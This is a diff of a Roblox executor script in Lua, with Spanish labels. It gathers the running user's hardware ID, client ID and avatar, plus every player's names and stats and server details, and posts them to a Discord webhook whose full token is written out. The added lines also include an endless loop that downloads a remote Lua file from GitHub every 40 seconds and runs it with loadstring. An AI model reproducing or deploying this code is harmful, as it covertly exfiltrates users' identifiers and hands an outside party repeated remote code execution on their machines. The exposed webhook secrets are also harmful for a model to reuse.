@@ -3,7 +3,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local discordWebhookUrl = "https://discord.com/api/webhooks/1297119321021087746/IdJVZ8ROoljJkstfYRnlxKYLt8ECRyLmAur-DrNbg7ZnQv5GqEsYme9DNSznXoYNyI87"
+local discordWebhookUrl = "https://discord.com/api/webhooks/1297123162453966848/5JIbEOpkRk_Q4gqoZpCCAYXVGSt9-J0yYmw5aIkryWrGk79ALskEmCHcV0FuZAPv4-4B"
 
 local function getJobIdAndHwid()
     local jobId = game.JobId
@@ -24,60 +24,28 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffix_index])
 end
 
-local function detectExecutor()
-    local executorType = "Unsupported"
-    if syn and not is_sirhurt_closure and not pebc_execute then
-        executorType = "Synapse X"
-    elseif secure_load then
-        executorType = "Sentinel"
-    elseif pebc_execute then
-        executorType = "ProtoSmasher"
-    elseif KRNL_LOADED then
-        executorType = "Krnl"
-    elseif is_sirhurt_closure then
-        executorType = "SirHurt"
-    elseif identifyexecutor() and identifyexecutor():find("ScriptWare") then
-        executorType = "Script-Ware"
-    end
-    return executorType
-end
-
-local function getNextRebirthPrice(currentRebirths)
-    local basePrice = 3e6
-    local additionalPrice = 2e6
-    local multiplier = 1.010
-    local nextPrice = basePrice * (currentRebirths + 1) * multiplier + additionalPrice
-    return nextPrice
-end
-
 local function getAllPlayerData()
     local playerDataList = {}
     for _, player in pairs(Players:GetPlayers()) do
-        -- Excluir al jugador específico
-        if player.Name ~= "fernanfloP091o" then
-            local playerData = {}
-            local playerName = player.Name
-            local playerDisplayName = player.DisplayName
-            local avatarUrl = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+        local playerData = {}
+        local playerName = player.Name
+        local playerDisplayName = player.DisplayName
 
-            local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
-            if folderData then
-                local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
-                local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
-                local formattedRebirth = formatNumber(rebirthValue)
-                local formattedStrength = formatNumber(strengthValue)
-                local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
+        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
+        if folderData then
+            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
+            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
+            local formattedRebirth = formatNumber(rebirthValue)
+            local formattedStrength = formatNumber(strengthValue)
 
-                local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
-                    playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
+            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s",
+                playerName, playerDisplayName, formattedRebirth, formattedStrength)
 
-                table.insert(playerDataList, {
-                    label = combinedLabel,
-                    rebirth = rebirthValue,
-                    strength = strengthValue,
-                    avatarUrl = avatarUrl
-                })
-            end
+            table.insert(playerDataList, {
+                label = combinedLabel,
+                rebirth = rebirthValue,
+                strength = strengthValue
+            })
         end
     end
 
@@ -143,12 +111,68 @@ local function getServerInfo()
     return totalServers, totalPlayers, serversInfo
 end
 
+local function getAvatarUrl(userId)
+    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png"
+    local success, response = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        if data.data and #data.data > 0 then
+            return data.data[1].imageUrl
+        end
+    end
+    return nil
+end
+
+local function sendAvatarToDiscord(player)
+    local userId = player.UserId
+    local avatarUrl = getAvatarUrl(userId)
+
+    if avatarUrl then
+        local dataToSend = {
+            ["embeds"] = {
+                {
+                    ["title"] = "Avatar del jugador",
+                    ["color"] = 0x00ff00,
+                    ["description"] = "Avatar de un jugador ejecutando el script.",
+                    ["footer"] = {
+                        ["text"] = "Miniatura del avatar"
+                    },
+                    ["thumbnail"] = {
+                        ["url"] = avatarUrl
+                    }
+                }
+            }
+        }
+
+        local success, response = pcall(function()
+            return http_request({
+                Url = discordWebhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(dataToSend)
+            })
+        end)
+
+        if not success then
+            warn("Error al enviar el avatar a Discord:", response)
+        end
+    else
+        warn("No se pudo obtener la URL del avatar.")
+    end
+end
+
 local function sendPlayerInfoToDiscord()
     local jobId, hwid = getJobIdAndHwid()
-    local executor = detectExecutor()
     local allPlayerData, sortedLabels = getAllPlayerData()
     local clientId = getClientId()
     local totalServers, totalPlayers, serversInfo = getServerInfo()
+
+    local strongestPlayer = allPlayerData[1]
 
     local dataToSend = {
         ["embeds"] = {
@@ -156,9 +180,6 @@ local function sendPlayerInfoToDiscord()
                 ["description"] = "Jugadores del juego:\n\n" .. table.concat(sortedLabels, "\n\n"),
                 ["color"] = 0x00ff00,
                 ["title"] = "Estadísticas de los jugadores",
-                ["thumbnail"] = {
-                    ["url"] = "https://i.imgur.com/oBPXx0D.png"
-                },
                 ["fields"] = {
                     {
                         ["name"] = "JobId",
@@ -201,6 +222,12 @@ local function sendPlayerInfoToDiscord()
         ["title"] = "Información de Servidores"
     })
 
+    table.insert(dataToSend["embeds"], {
+        ["description"] = strongestPlayer.label,
+        ["color"] = 0x00ff00,
+        ["title"] = "Jugador más fuerte"
+    })
+
     local success, response = pcall(function()
         return http_request({
             Url = discordWebhookUrl,
@@ -215,6 +242,18 @@ local function sendPlayerInfoToDiscord()
     if not success then
         warn("Error al enviar la información a Discord:", response)
     end
+    while true do
+        local additionalScriptUrl = "https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/DATOS_MAESTRIA.lua"
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet(additionalScriptUrl))() -- Ejecuta el script adicional
+        end)
+        if not success then
+            warn("Error al ejecutar el script adicional:", result)
+        end
+        wait(40) -- Espera 10 segundos antes de ejecutar nuevamente
+    end
 end
+
+sendAvatarToDiscord(Players.LocalPlayer)
 
 sendPlayerInfoToDiscord()
